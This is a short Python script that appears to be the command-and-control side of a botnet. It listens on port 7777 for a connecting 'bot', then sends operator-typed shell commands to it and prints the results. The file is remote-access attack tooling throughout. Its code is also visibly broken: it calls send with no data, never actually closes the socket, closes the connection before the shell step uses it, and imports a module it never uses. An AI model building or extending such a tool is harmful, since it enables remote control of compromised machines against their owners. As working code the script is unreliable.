import socket
from pexpect import pxssh
from termcolor import colored

def setup(p):
    global bot
    global address
    global server
    host = socket.gethostbyname(socket.gethostname())
    port = p
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(7)
    bot, address = server.accept()
    print(f"Bot {address} is attempting to connect")
    message = bot.recv(1024).decode('utf-8')
    print(f"{message}")
    bot.send()
    bot.close
    print(f"Connection with Bot {address} has been terminated")

def shell():
    command = input(colored("* Shell#~%s: " % str(address), 'green'))
    bot.send(command.encode('utf-8'))
    message = bot.recv(1024)
    print(message.decode('utf-8'))

setup(7777)
shell()